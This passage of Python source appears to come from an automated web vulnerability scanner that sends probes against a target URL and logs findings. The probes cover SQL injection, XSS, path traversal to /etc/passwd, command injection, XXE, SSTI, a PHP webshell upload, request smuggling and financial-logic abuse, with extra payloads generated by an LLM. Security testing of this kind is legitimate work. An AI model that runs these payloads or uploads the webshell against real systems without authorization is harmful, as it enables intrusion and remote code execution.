                    "pages_crawled": len(crawled),
                },
                confidence=0.8,
            )

    def parameter_fuzzing(self):
        """
        Fuzz discovered parameters with a variety of injection payloads.

        Uses parameters stored in self.discovered_parameters and tests
        each with payloads for SQL injection, XSS, path traversal, command
        injection, null bytes, large values, and special characters. Flags
        server errors (500) and payload reflection as potential issues.

        Returns:
            None. Findings are appended to self.findings.
        """
        logger.info("Running parameter fuzzing")

        if not self.discovered_parameters:
            return

        # Simple fuzz payloads to test parameter handling
        fuzz_payloads = [
            ("sqli", "' OR '1'='1"),
            ("sqli_comment", "admin'--"),
            ("xss", "<script>alert(1)</script>"),
            ("path_traversal", "../../../etc/passwd"),
            ("cmd_injection", "; id"),
            ("null_byte", "test%00.jpg"),
            ("large_value", "A" * 10000),
            ("special_chars", "!@#$%^&*()"),
        ]

        all_params = []
        for param_list in self.discovered_parameters.values():
            all_params.extend(param_list)

        tested = 0
        for param in all_params[:MAX_PARAMETERS_TO_FUZZ]:  # Limit to first 20 params
            for fuzz_type, payload in fuzz_payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                resp = self._safe_request("GET", test_url)
                tested += 1

                if not resp:
                    continue

                # Check for interesting responses
                if resp.status_code == 500:
                    self._add_finding(
                        finding_type="PARAMETER_FUZZ_500",
                        severity="MEDIUM",
                        endpoint=test_url,
                        evidence={
                            "parameter": param,
                            "payload_type": fuzz_type,
                            "payload": payload,
                            "status_code": 500,
                            "message": "Payload caused server error",
                        },
                        confidence=0.5,
                    )
                elif payload in resp.text:
                    self._add_finding(
                        finding_type="PARAMETER_REFLECTION",
                        severity="LOW",
                        endpoint=test_url,
                        evidence={
                            "parameter": param,
                            "payload_type": fuzz_type,
                            "payload": payload,
                            "message": "Payload reflected in response",
                        },
                        confidence=0.6,
                    )

        logger.info(f"Parameter fuzzing complete: {tested} tests performed")

    def check_mass_assignment(self):
        """Check for mass assignment vulnerabilities."""
        api_paths = ["/api/v1/users", "/api/users", "/api/v1/accounts", "/api/accounts"]

        resp = None
        for path in api_paths:
            url = urljoin(self.target_url, path.lstrip("/"))

            llm_payloads = []
            if self.llm_payload_generator and self.llm_payload_generator.is_available():
                llm_payloads = self.llm_payload_generator.generate_sync(
                    vuln_class="MASS_ASSIGNMENT",
                    param_name="json_body",
                    response_snippet="",
                    framework_hints=self._tech_hints(resp) if resp else ", ".join(self.tech_stack),
                )

            all_payloads = self.MASS_ASSIGN_PAYLOADS[:2] + llm_payloads[:LLM_MAX_GENERATED_PAYLOADS]
            for payload in all_payloads:
                resp = self._safe_request(
                    "POST", url,
                    json=json.loads(payload),
                    headers={"Content-Type": "application/json"},
                )
                if resp and resp.status_code in (200, 201):
                    # Check if response contains admin-related fields
                    try:
                        data = resp.json()
                        data_str = json.dumps(data).lower()
                        if any(x in data_str for x in ["admin", "role", "privilege", "is_admin"]):
                            self._add_finding(
                                finding_type="MASS_ASSIGNMENT",
                                severity="HIGH",
                                endpoint=url,
                                evidence={
                                    "payload": payload,
                                    "response_preview": json.dumps(data)[:200],
                                },
                                confidence=0.6,
                            )
                    except (json.JSONDecodeError, ValueError):
                        pass

    def check_xss(self):
        """Check for reflected XSS with improved validation."""
        resp = self._safe_request("GET", self.target_url)
        if not resp:
            return

        # Find URL parameters that accept user input
        params = re.findall(r'[?&]([\w-]+)=', resp.text)
        if not params:
            return

        # Only test inputs that look like they accept user data
        # Avoid testing navigation params
        ignore_params = ['redirect', 'next', 'url', 'dest', 'target', 'goto',
                        'continue', 'return', 'ref', 'dest_url']

        for param in set(params[:5]):
            if param.lower() in ignore_params:
                continue

            # Generate LLM payloads for this parameter context
            llm_payloads = []
            if self.llm_payload_generator and self.llm_payload_generator.is_available():
                llm_payloads = self.llm_payload_generator.generate_sync(
                    vuln_class="XSS",
                    param_name=param,
                    response_snippet=self._redact_for_llm(resp.text) if resp else "",
                    framework_hints=self._tech_hints(resp),
                )

            # Use static payloads + LLM-generated payloads
            all_payloads = self.XSS_PAYLOADS[:3] + llm_payloads[:LLM_MAX_GENERATED_PAYLOADS]

            for payload in all_payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                test_resp = self._safe_request("GET", test_url)
                if not test_resp:
                    continue

                # Check if payload is reflected UNENCODED
                # This matters - <script> vs &lt;script&gt;
                if payload in test_resp.text:
                    # Only flag HIGH if it's in script context or event handler
                    # Not just reflected in HTML (which browsers escape)
                    is_script_context = "<script>" in test_resp.text.lower() or "<script " in test_resp.text.lower()

                    # Calculate confidence based on context
                    if is_script_context:
                        confidence = 0.85
                        severity = "HIGH"
                    elif payload.startswith("<img") or payload.startswith("<svg"):
                        # These can work in some contexts
                        confidence = 0.7
                        severity = "MEDIUM"
                    else:
                        confidence = 0.5
                        severity = "LOW"

                    self._add_finding(
                        finding_type="REFLECTED_XSS",
                        severity=severity,
                        endpoint=test_url,
                        evidence={
                            "parameter": param,
                            "payload": payload,
                            "reflected": True,
                            "verified": is_script_context,
                        },
                        confidence=confidence,
                    )
                    break

    def check_ssti(self):
        """Check for Server-Side Template Injection with improved validation."""
        resp = self._safe_request("GET", self.target_url)
        if not resp:
            return

        params = re.findall(r'[?&](\w+)=', resp.text)
        if not params:
            return

        for param in set(params[:3]):
            # Generate LLM payloads for this parameter context
            llm_payloads = []
            if self.llm_payload_generator and self.llm_payload_generator.is_available():
                llm_payloads = self.llm_payload_generator.generate_sync(
                    vuln_class="SSTI",
                    param_name=param,
                    response_snippet=self._redact_for_llm(resp.text) if resp else "",
                    framework_hints=self._tech_hints(resp),
                )

            # Static + LLM payloads
            test_payloads = ['{{7*7}}', '${7*7}', '<%= 7*7 %>'] + llm_payloads[:LLM_MAX_GENERATED_PAYLOADS]
            for payload in test_payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                test_resp = self._safe_request("GET", test_url)
                if not test_resp:
                    continue

                # Must see EVALUATION (49), not just reflection
                # Check for patterns like "49", " 49 ", or numeric 49 in context
                has_evaluation = " 49 " in test_resp.text or ">49<" in test_resp.text

                # Also verify it's NOT error or part of another word
                if has_evaluation and "error" not in test_resp.text.lower() and "undefined" not in test_resp.text.lower():
                        self._add_finding(
                            finding_type="SSTI",
                            severity="CRITICAL",
                            endpoint=test_url,
                            evidence={
                                "parameter": param,
                                "payload": payload,
                                "result": "49 (7*7 evaluated)",
                                "verified": True,
                            },
                            confidence=0.9,
                        )
                        break

    def check_lfi(self):
        """Check for Local File Inclusion."""
        resp = self._safe_request("GET", self.target_url)
        if not resp:
            return

        params = re.findall(r'[?&](\w+)=', resp.text)
        if not params:
            return

        for param in set(params[:3]):
            llm_payloads = []
            if self.llm_payload_generator and self.llm_payload_generator.is_available():
                llm_payloads = self.llm_payload_generator.generate_sync(
                    vuln_class="LFI",
                    param_name=param,
                    response_snippet=self._redact_for_llm(resp.text) if resp else "",
                    framework_hints=self._tech_hints(resp),
                )

            all_payloads = self.LFI_PAYLOADS[:2] + llm_payloads[:LLM_MAX_GENERATED_PAYLOADS]
            for payload in all_payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                test_resp = self._safe_request("GET", test_url)
                if test_resp and "root:x:" in test_resp.text:
                    self._add_finding(
                        finding_type="LFI",
                        severity="CRITICAL",
                        endpoint=test_url,
                        evidence={
                            "parameter": param,
                            "payload": payload,
                            "file_read": "/etc/passwd",
                        },
                        confidence=0.8,
                    )
                    break

    def check_xxe(self):
        """Check for XML External Entity injection."""
        xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

        resp = self._safe_request(
            "POST", self.target_url,
            data=xxe_payload,
            headers={"Content-Type": "application/xml"},
        )
        if resp and "root:x:" in resp.text:
            self._add_finding(
                finding_type="XXE",
                severity="CRITICAL",
                endpoint=self.target_url,
                evidence={
                    "payload": "XXE file:///etc/passwd",
                    "file_read": "/etc/passwd",
                },
                confidence=0.8,
            )

    def check_graphql_introspection(self):
        """Check for enabled GraphQL introspection."""
        for path in self.GRAPHQL_ENDPOINTS:
            url = urljoin(self.target_url, path.lstrip("/"))
            # Check if endpoint exists
            resp = self._safe_request("GET", url)
            if not resp or resp.status_code not in (200, 400, 405):
                continue

            # Send introspection query (fixed syntax from user's example)
            introspection_query = {
                "query": "{__schema{kind,fields{name}}}"
            }
            resp = self._safe_request(
                "POST", url,
                json=introspection_query,
                headers={"Content-Type": "application/json"}
            )
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if "__schema" in data.get("data", {}):
                        self._add_finding(
                            finding_type="GRAPHQL_INTROSPECTION_ENABLED",
                            severity="HIGH",
                            endpoint=url,
                            evidence={
                                "message": "GraphQL introspection is enabled",
                                "response_preview": json.dumps(data)[:200],
                            },
                            confidence=0.9,
                        )
                        break
                except json.JSONDecodeError:
                    pass

        # GraphQL depth/complexity check — detect excessive schema exposure
        for path in self.GRAPHQL_ENDPOINTS:
            url = urljoin(self.target_url, path.lstrip("/"))
            depth_query = {
                "query": "{__schema{types{name,fields{name,type{name,fields{name}}}}}}"
            }
            resp = self._safe_request(
                "POST", url,
                json=depth_query,
                headers={"Content-Type": "application/json"}
            )
            if resp and resp.status_code == 200 and len(resp.text) > 5000:
                self._add_finding(
                    finding_type="GRAPHQL_DEEP_INTROSPECTION",
                    severity="MEDIUM",
                    endpoint=url,
                    evidence={
                        "response_size": len(resp.text),
                        "message": "GraphQL schema exposes deeply nested type details",
                    },
                    confidence=0.7,
                )
            break  # Only test first available endpoint

        # GraphQL SQLi-in-resolver test
        for path in self.GRAPHQL_ENDPOINTS[:1]:
            url = urljoin(self.target_url, path.lstrip("/"))
            sqli_query = {"query": "{users(search:\"' OR 1=1--\"){id,name}}"}
            resp = self._safe_request(
                "POST", url,
                json=sqli_query,
                headers={"Content-Type": "application/json"}
            )
            if resp and resp.status_code == 200 and resp.text and len(resp.text.strip("{} \t\n\r\x00")) > 5:
                try:
                    data = resp.json()
                    if isinstance(data.get("data"), dict) and len(data.get("data", {})) > 0:
                        self._add_finding(
                            finding_type="GRAPHQL_SQLI_RESOLVER",
                            severity="CRITICAL",
                            endpoint=url,
                            evidence={
                                "payload": sqli_query["query"],
                                "response_preview": json.dumps(data)[:200],
                                "message": "Possible SQL injection in GraphQL resolver — query returned data",
                            },
                            confidence=0.6,
                        )
                except json.JSONDecodeError:
                    pass

    def check_financial_logic(self):
        """Test financial API endpoints for business logic flaws."""
        for path in self.TRANSFER_PATHS:
            url = urljoin(self.target_url, path)
            base_payload = {"from": "test_source", "to": "test_dest"}

            # Test 1: Negative amount
            neg_resp = self._safe_request("POST", url,
                json={**base_payload, "amount": -100},
                session=self.session)
            if neg_resp and neg_resp.status_code in (200, 201):
                self._add_finding(
                    finding_type="NEGATIVE_AMOUNT_ACCEPTED",
                    severity="HIGH",
                    endpoint=url,
                    evidence={"amount": -100, "status": neg_resp.status_code,
                              "message": "API accepted a negative transaction amount"},
                    confidence=0.85,
                )

            # Test 2: Zero amount
            zero_resp = self._safe_request("POST", url,
                json={**base_payload, "amount": 0},
                session=self.session)
            if zero_resp and zero_resp.status_code in (200, 201):
                self._add_finding(
                    finding_type="ZERO_AMOUNT_ACCEPTED",
                    severity="MEDIUM",
                    endpoint=url,
                    evidence={"amount": 0, "status": zero_resp.status_code,
                              "message": "API accepted a zero-value transaction"},
                    confidence=0.75,
                )

            # Test 3: Extremely large amount
            large_resp = self._safe_request("POST", url,
                json={**base_payload, "amount": 99999999999},
                session=self.session)
            if large_resp and large_resp.status_code in (200, 201):
                self._add_finding(
                    finding_type="NO_TRANSACTION_LIMIT",
                    severity="HIGH",
                    endpoint=url,
                    evidence={"amount": 99999999999, "status": large_resp.status_code,
                              "message": "API accepted an extremely large amount with no limit"},
                    confidence=0.8,
                )

            # Test 4: Idempotency / replay check
            replay_responses = []
            replay_payload = {**base_payload, "amount": 1}
            for _ in range(3):
                r = self._safe_request("POST", url, json=replay_payload, session=self.session)
                if r:
                    replay_responses.append(r.status_code)
            if replay_responses.count(200) + replay_responses.count(201) >= 2:
                self._add_finding(
                    finding_type="REPLAY_VULNERABLE",
                    severity="MEDIUM",
                    endpoint=url,
                    evidence={"success_count": replay_responses.count(200),
                              "total_requests": 3,
                              "message": "API accepted repeated identical requests — no idempotency key"},
                    confidence=0.7,
                )
            break  # Only test first available endpoint

    def check_file_upload(self):
        """Test file upload endpoints for security controls."""
        # Small PHP webshell payload
        php_payload = b"<?php @eval($_POST['cmd']); ?>"
        malicious_payloads = [
            ("shell.php", php_payload, "application/x-php"),
            ("test.php.jpg", b"<?php phpinfo(); ?>", "image/jpeg"),
            ("../../../etc/passwd", b"content", "text/plain"),
            ("test.phtml", php_payload, "application/x-httpd-php"),
            ("test.phar", php_payload, "application/octet-stream"),
        ]

        for path in self.UPLOAD_PATHS:
            url = urljoin(self.target_url, path)
            for filename, content, mime in malicious_payloads:
                resp = self._safe_request("POST", url,
                    files={"file": (filename, content, mime)},
                    session=self.session)
                if resp and resp.status_code in (200, 201):
                    if filename.endswith(".php") or filename.endswith(".phtml") or filename.endswith(".phar"):
                        self._add_finding(
                            finding_type="UNRESTRICTED_FILE_UPLOAD",
                            severity="CRITICAL",
                            endpoint=url,
                            evidence={"filename": filename, "mime": mime,
                                      "status": resp.status_code,
                                      "message": f"Executable file '{filename}' accepted by server"},
                            confidence=0.9,
                        )
                    if ".." in filename:
                        self._add_finding(
                            finding_type="PATH_TRAVERSAL_IN_FILENAME",
                            severity="HIGH",
                            endpoint=url,
                            evidence={"filename": filename, "status": resp.status_code,
                                      "message": "Path traversal characters accepted in filename"},
                            confidence=0.85,
                        )
            break  # Only test first available endpoint

    def check_token_storage(self):
        """Check if JWT/session tokens are stored in localStorage."""
        resp = self._safe_request("GET", self.target_url)
        if not resp:
            return

        # Look for localStorage.setItem with token keywords in page JS
        token_storage_patterns = [
            r'localStorage\.setItem\s*\(\s*["\'].*(?:token|jwt|auth|session|access)',
            r'localStorage\[["\'].*(?:token|jwt|auth)\s*["\']\s*\]\s*=',
        ]
        for pattern in token_storage_patterns:
            match = re.search(pattern, resp.text, re.I)
            if match:
                context_start = max(0, match.start() - 30)
                context_end = min(len(resp.text), match.end() + 50)
                self._add_finding(
                    finding_type="TOKEN_IN_LOCALSTORAGE",
                    severity="MEDIUM",
                    endpoint=self.target_url,
                    evidence={
                        "snippet": resp.text[context_start:context_end],
                        "pattern": pattern,
                        "message": "JWT or session token stored in localStorage — vulnerable to XSS extraction",
                    },
                    confidence=0.8,
                )
                break

    def check_session_expiration(self):
        """Check whether login tokens have expiry claims (JWT exp field)."""
        # Try to extract JWTs from responses — look in common auth response patterns
        auth_paths = ["/api/auth/login", "/api/login", "/auth/login"]
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'

        for path in auth_paths:
            url = urljoin(self.target_url, path.lstrip("/"))
            resp = self._safe_request("POST", url,
                json={"username": "test", "password": "test"},
                headers={"Content-Type": "application/json"})
            if not resp:
                continue

            # Look for JWT in response body
            tokens = re.findall(jwt_pattern, resp.text)
            if not tokens:
                # Check response headers too
                auth_header = resp.headers.get("Authorization") or resp.headers.get("Set-Cookie", "")
                tokens = re.findall(jwt_pattern, auth_header)

            for raw_token in tokens[:2]:
                try:
                    # Decode JWT without signature verification
                    import base64 as _b64
                    parts = raw_token.split(".")
                    if len(parts) != 3:
                        continue
                    payload_bytes = _b64.urlsafe_b64decode(parts[1] + "==")
                    payload = json.loads(payload_bytes)
                    exp = payload.get("exp")
                    now = time.time()

                    if not exp:
                        self._add_finding(
                            finding_type="NO_TOKEN_EXPIRATION",
                            severity="HIGH",
                            endpoint=url,
                            evidence={
                                "token_preview": raw_token[:30] + "...",
                                "jwt_payload_keys": list(payload.keys()),
                                "message": "JWT has no 'exp' claim — token never expires",
                            },
                            confidence=0.9,
                        )
                    elif exp - now > 86400 * 30:
                        days = min(int((exp - now) / 86400), 365)
                        self._add_finding(
                            finding_type="EXCESSIVE_TOKEN_LIFETIME",
                            severity="MEDIUM",
                            endpoint=url,
                            evidence={
                                "expiry_days": days,
                                "token_preview": raw_token[:30] + "...",
                                "message": f"JWT expiry set to {days} days — exceeds 30-day maximum",
                            },
                            confidence=0.8,
                        )
                except Exception:
                    continue
            break

    def check_password_reset_strength(self):
        """Detect weak reset tokens — numeric-only PINs, short codes."""
        for path in self.RESET_PATHS:
            url = urljoin(self.target_url, path)
            resp = self._safe_request("POST", url,
                json={"email": "test@example.com"},
                headers={"Content-Type": "application/json"})
            # Only fall back to form-encoded if JSON was explicitly rejected (415)
            if resp and resp.status_code == 415:
                resp = self._safe_request("POST", url,
                    data={"email": "test@example.com"})

            if resp and resp.status_code in (200, 201):
                try:
                    data = resp.json()
                except json.JSONDecodeError:
                    data = {}
                reset_token = str(data.get("token") or data.get("code") or data.get("pin") or "")
                if not reset_token:
                    # Check if token is embedded in a message
                    token_match = re.search(r'(?:token|code|pin)[:\s]+["\']?(\w{3,32})["\']?', resp.text, re.I)
                    if token_match:
                        reset_token = token_match.group(1)

                if reset_token:
                    if reset_token.isdigit() and len(reset_token) <= 6:
                        self._add_finding(
                            finding_type="WEAK_RESET_TOKEN",
                            severity="HIGH",
                            endpoint=url,
                            evidence={"token_length": len(reset_token), "type": "numeric",
                                      "message": f"Password reset uses a {len(reset_token)}-digit numeric PIN — brute-forceable"},
                            confidence=0.85,
                        )
                    elif len(reset_token) < 16:
                        self._add_finding(
                            finding_type="SHORT_RESET_TOKEN",
                            severity="MEDIUM",
                            endpoint=url,
                            evidence={"token_length": len(reset_token),
                                      "message": f"Reset token is only {len(reset_token)} chars — minimum recommended is 32"},
                            confidence=0.7,
                        )
            break  # Only test first available endpoint

    def check_rate_limiting(self):
        """Test whether endpoints enforce rate limiting."""
        for path in self.RATE_LIMIT_PATHS:
            url = urljoin(self.target_url, path)
            responses = []
            for _ in range(20):
                r = self._safe_request("POST", url,
                    json={"username": "test", "password": "wrong"},
                    headers={"Content-Type": "application/json"})
                if r:
                    responses.append(r.status_code)

            has_rate_limit = any(code in (429, 403) for code in responses)
            if not has_rate_limit and len(responses) >= 15:
                self._add_finding(
                    finding_type="NO_RATE_LIMITING",
                    severity="HIGH",
                    endpoint=url,
                    evidence={
                        "requests_sent": 20,
                        "responses_received": len(responses),
                        "rate_limit_response_received": False,
                        "status_codes_seen": list(set(responses)),
                        "message": "No 429/403 response after 20 rapid requests — no rate limiting in place",
                    },
                    confidence=0.85,
                )
            break  # Only test first available endpoint

    def check_race_conditions(self):
        """Test financial endpoints for race conditions via simultaneous requests."""
        import concurrent.futures as _cf

        for path in self.RACE_PATHS:
            url = urljoin(self.target_url, path)
            payload = {"amount": 1, "from": "race_source", "to": "race_dest"}

            # Use a barrier to maximize simultaneity
            barrier = threading.Barrier(5, timeout=5)
            barrier_broken = [False]  # Mutable to capture from thread closures

            def _race_request(barrier=barrier, barrier_broken=barrier_broken, url=url, payload=payload):
                try:
                    barrier.wait(timeout=5)
                except threading.BrokenBarrierError:
                    barrier_broken[0] = True
                return self._safe_request("POST", url, json=payload, session=self.session)

            with _cf.ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(_race_request) for _ in range(5)]
                responses = [f.result() for f in _cf.as_completed(futures)]

            if barrier_broken[0]:
                continue  # Test inconclusive — threads didn't synchronize

            success_count = sum(1 for r in responses if r and r.status_code in (200, 201))
            if success_count > 1:
                self._add_finding(
                    finding_type="RACE_CONDITION",
                    severity="CRITICAL",
                    endpoint=url,
                    evidence={
                        "simultaneous_requests": 5,
                        "successful_responses": success_count,
                        "response_codes": [r.status_code for r in responses if r],
                        "note": "Multiple concurrent requests succeeded — possible double-spend",
                    },
                    confidence=0.8,
                )
            break  # Only test first available endpoint

    def check_bopla(self):
        """Check for sensitive fields in API responses (Broken Object Property Level Auth)."""
        api_paths = ["/api/v1/users", "/api/users", "/api/v1/accounts", "/api/accounts",
                     "/api/v1/me", "/api/me", "/api/profile"]

        for path in api_paths:
            url = urljoin(self.target_url, path.lstrip("/"))
            resp = self._safe_request("GET", url, session=self.session,
                headers={"Content-Type": "application/json"})
            if not resp or resp.status_code != 200:
                continue

            try:
                data = resp.json()
            except json.JSONDecodeError:
                continue

            # Search response for sensitive field names
            data_str = json.dumps(data).lower()
            exposed_fields = []
            for field in self.SENSITIVE_RESPONSE_FIELDS:
                pattern = f'"{field}"'
                if pattern in data_str:
                    exposed_fields.append(field)

            if exposed_fields:
                self._add_finding(
                    finding_type="SENSITIVE_FIELD_EXPOSURE",
                    severity="HIGH",
                    endpoint=url,
                    evidence={
                        "exposed_fields": exposed_fields,
                        "response_keys": list(data.keys()) if isinstance(data, dict) else "array",
                        "message": f"API response includes {len(exposed_fields)} sensitive fields that should be filtered",
                    },
                    confidence=0.85,
                )

    def check_predictable_identifiers(self):
        """Detect predictable object IDs via entropy analysis of sequential requests."""
        import math as _math
        from collections import Counter as _Counter

        # Find URLs with numeric ID patterns
        resp = self._safe_request("GET", self.target_url)
        if not resp:
            return

        id_pattern = r'(?:/(\d{3,})(?:\?|/|$))'
        candidate_ids = re.findall(id_pattern, resp.text)
        if not candidate_ids:
            return

        # Make sequential requests and extract new IDs
        all_ids = [int(x) for x in set(candidate_ids)]
        for _ in range(4):
            next_url = self.target_url
            if all_ids:
                next_url = f"{self.target_url}?id={all_ids[-1] + 1}"
            r = self._safe_request("GET", next_url)
            if r:
                new_ids = [int(x) for x in re.findall(id_pattern, r.text)]
                all_ids.extend(new_ids)

        if len(all_ids) < 8:
            return

        # Sort IDs — entropy is computed on gaps between consecutive sorted values
        all_ids = sorted(set(all_ids))

        # Shannon entropy calculation
        counter = _Counter()
        for i in range(len(all_ids) - 1):
            counter[all_ids[i + 1] - all_ids[i]] += 1

        total = sum(counter.values())
        entropy = 0.0
        for count in counter.values():
            p = count / total
            if p > 0:
                entropy -= p * _math.log2(p)

        # Low entropy in gaps = sequential/predictable IDs
        if entropy < 2.0 and len(all_ids) >= 8:
            self._add_finding(
                finding_type="PREDICTABLE_IDENTIFIERS",
                severity="MEDIUM",
                endpoint=self.target_url,
                evidence={
                    "sample_ids": sorted(set(all_ids))[:10],
                    "id_gaps": dict(counter.most_common(5)),
                    "entropy": round(entropy, 2),
                    "message": f"Object IDs have low entropy ({entropy:.1f}) — likely sequential or predictable",
                },
                confidence=0.7,
            )

    def check_jwt_algorithm_confusion(self):
        """Check for JWT algorithm confusion vulnerabilities."""
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        resp = self._safe_request("GET", self.target_url)
        if not resp:
            return

        jwts = re.findall(jwt_pattern, resp.text)
        # Check JS files for JWTs
        js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', resp.text)
        for js_url in js_urls[:5]:
            if not js_url.startswith("http"):
                js_url = urljoin(self.target_url, js_url)
            js_resp = self._safe_request("GET", js_url)
            if js_resp and js_resp.status_code == 200:
                jwts.extend(re.findall(jwt_pattern, js_resp.text))

        jwts = list(set(jwts))[:3]  # Deduplicate, limit to 3
        for jwt_token in jwts:
            finding = test_jwt_alg_none(
                jwt_token=jwt_token,
                target_url=self.target_url,
                request_func=lambda url, headers: self._safe_request("GET", url, headers=headers),
            )
            if finding:
                self._add_finding(
                    finding_type=finding["type"],
                    severity=finding["severity"],
                    endpoint=finding["endpoint"],
                    evidence=finding["evidence"],
                    confidence=finding["confidence"],
                )
                return

    def check_prototype_pollution(self):
        """Check for prototype pollution vulnerabilities."""
        for payload in self.PROTOTYPE_POLLUTION_PAYLOADS:
            test_url = f"{self.target_url}{payload}"
            resp = self._safe_request("GET", test_url)
            if not resp:
                continue
            if resp.status_code == 200 and ("isAdmin" in resp.text or "true" in resp.text.lower()):
                self._add_finding(
                    finding_type="PROTOTYPE_POLLUTION",
                    severity="MEDIUM",
                    endpoint=test_url,
                    evidence={
                        "payload": payload,
                        "response_status": resp.status_code,
                        "message": "Potential prototype pollution via query parameter",
                    },
                    confidence=0.6,
                )
                break

    def check_cache_poisoning(self):
        """Check for cache poisoning vulnerabilities."""
        resp = self._safe_request("GET", self.target_url, headers=self.CACHE_POISONING_HEADERS)
        if not resp:
            return

        # Check if response is cacheable
        cache_control = resp.headers.get("Cache-Control", "")
        expires = resp.headers.get("Expires", "")
        if not cache_control and not expires:
            return

        if "127.0.0.1" in resp.text:
            self._add_finding(
                finding_type="CACHE_POISONING",
                severity="MEDIUM",
                endpoint=self.target_url,
                evidence={
                    "headers_sent": self.CACHE_POISONING_HEADERS,
                    "response_preview": resp.text[:200],
                    "message": "Cacheable response includes poisoned headers",
                },
                confidence=0.7,
            )

    def check_http_request_smuggling(self):
        """Check for HTTP request smuggling (CL.TE and TE.CL)."""
        # CL.TE Test
        cl_te_headers = {"Content-Length": "6", "Transfer-Encoding": "chunked"}
        resp = self._safe_request(
            "POST", self.target_url,
            headers=cl_te_headers,
            data="0\r\n\r\n"
        )
        if resp and resp.status_code in (400, 500, 502, 504):
            self._add_finding(
                finding_type="HTTP_REQUEST_SMUGGLING_CL_TE",
                severity="HIGH",
                endpoint=self.target_url,
                evidence={
                    "technique": "CL.TE",
                    "status_code": resp.status_code,
                    "message": "Potential CL.TE desync detected",
                },
                confidence=0.6,
            )

        # TE.CL Test
        te_cl_headers = {"Transfer-Encoding": "chunked", "Content-Length": "6"}
        resp = self._safe_request(
            "POST", self.target_url,
            headers=te_cl_headers,
            data="0\r\n\r\n"
        )
        if resp and resp.status_code in (400, 500, 502, 504):
            self._add_finding(
                finding_type="HTTP_REQUEST_SMUGGLING_TE_CL",
                severity="HIGH",
                endpoint=self.target_url,
                evidence={
                    "technique": "TE.CL",
                    "status_code": resp.status_code,
                    "message": "Potential TE.CL desync detected",
                },
                confidence=0.6,
            )

    def check_dom_xss(self):
        """Check for DOM-based XSS."""
        resp = self._safe_request("GET", self.target_url)
        if not resp:
            return

        # Check for DOM sinks
        dom_sinks = ["document.write", "innerHTML", "eval(", "setTimeout(", "setInterval("]
        if not any(sink in resp.text for sink in dom_sinks):
            return

        # Test payloads
        llm_payloads = []
        if self.llm_payload_generator and self.llm_payload_generator.is_available():
            llm_payloads = self.llm_payload_generator.generate_sync(
                vuln_class="DOM_XSS",
                param_name="q",
                response_snippet=self._redact_for_llm(resp.text) if resp else "",
                framework_hints=self._tech_hints(resp),
            )

        dom_payloads = ["<img src=x onerror=alert(1)>", "<script>alert(1)</script>"] + llm_payloads[:LLM_MAX_GENERATED_PAYLOADS]
        for payload in dom_payloads:
            test_url = f"{self.target_url}?q={payload}"
            test_resp = self._safe_request("GET", test_url)
            if test_resp and payload in test_resp.text:
                self._add_finding(
                    finding_type="DOM_XSS",
                    severity="HIGH",
                    endpoint=test_url,
                    evidence={
                        "payload": payload,
                        "reflected": True,
                        "dom_sinks_present": True,
                        "message": "Payload reflected without encoding, DOM sinks detected",
                    },
                    confidence=0.7,
                )
                break

    def check_openapi_discovery(self):
        """Check for exposed OpenAPI/Swagger specifications."""
        for path in self.OPENAPI_PATHS:
            url = urljoin(self.target_url, path.lstrip("/"))
            resp = self._safe_request("GET", url)
            if not resp or resp.status_code != 200:
                continue

            content_type = resp.headers.get("Content-Type", "")
            if "json" not in content_type:
                continue

            try:
                spec = resp.json()
                if "openapi" in spec or "swagger" in spec or "paths" in spec:
                    endpoints = list(spec.get("paths", {}).keys())[:10]
                    self._add_finding(
                        finding_type="OPENAPI_SPEC_EXPOSED",
                        severity="MEDIUM",
                        endpoint=url,
                        evidence={
                            "spec_type": "openapi" if "openapi" in spec else "swagger",
                            "endpoints_exposed": endpoints,
                            "spec_preview": json.dumps(spec)[:200],
                        },
                        confidence=0.9,
                    )
                    break
            except json.JSONDecodeError:
                pass

    def differential_analysis(self):
        """
        Compare baseline response against modified requests to detect
        anomalies, parameter pollution, and method override issues.

        Sends variations of the baseline request (method override headers,
        parameter pollution, null byte injection, large content length) and
        flags responses that differ significantly in status code, body length,
        or response time.

        Returns:
            None. Findings are appended to self.findings.
        """
        logger.info("Running differential analysis")

        # Establish baseline
        baseline = self._safe_request("GET", self.target_url)
        if not baseline:
            return

        baseline_status = baseline.status_code
        baseline_len = len(baseline.text)
        baseline_time = baseline.elapsed.total_seconds()

        # Test cases: method override, parameter pollution, header anomalies
        test_cases = [
            {
                "name": "method_override_get",
                "method": "POST",
                "url": self.target_url,
                "headers": {"X-HTTP-Method-Override": "GET"},
                "data": "",
            },
            {
                "name": "method_override_delete",
                "method": "POST",
                "url": self.target_url,
                "headers": {"X-HTTP-Method-Override": "DELETE"},
                "data": "",
            },
            {
                "name": "parameter_pollution",
                "method": "GET",
                "url": f"{self.target_url}?id=1&id=2&id=3",
                "headers": {},
            },
            {
                "name": "null_byte_injection",
                "method": "GET",
                "url": f"{self.target_url}?file=test.txt%00.jpg",
                "headers": {},
            },
            {
                "name": "large_content_length",
                "method": "POST",
                "url": self.target_url,
                "headers": {"Content-Length": "999999999"},
                "data": "x",
            },
        ]

        for test in test_cases:
            try:
                kwargs = {
                    "headers": test.get("headers", {}),
                }
                if "data" in test:
                    kwargs["data"] = test["data"]

                resp = self._safe_request(test["method"], test["url"], **kwargs)
                if not resp:
                    continue

                status_diff = resp.status_code != baseline_status
                len_diff = abs(len(resp.text) - baseline_len) > 100
                time_diff = abs(resp.elapsed.total_seconds() - baseline_time) > 2

                if status_diff or len_diff or time_diff:
                    self._add_finding(
                        finding_type="DIFFERENTIAL_ANOMALY",
                        severity="MEDIUM",
                        endpoint=test["url"],
                        evidence={
                            "test_name": test["name"],
                            "baseline_status": baseline_status,
                            "modified_status": resp.status_code,
                            "baseline_length": baseline_len,
                            "modified_length": len(resp.text),
                            "baseline_time": baseline_time,
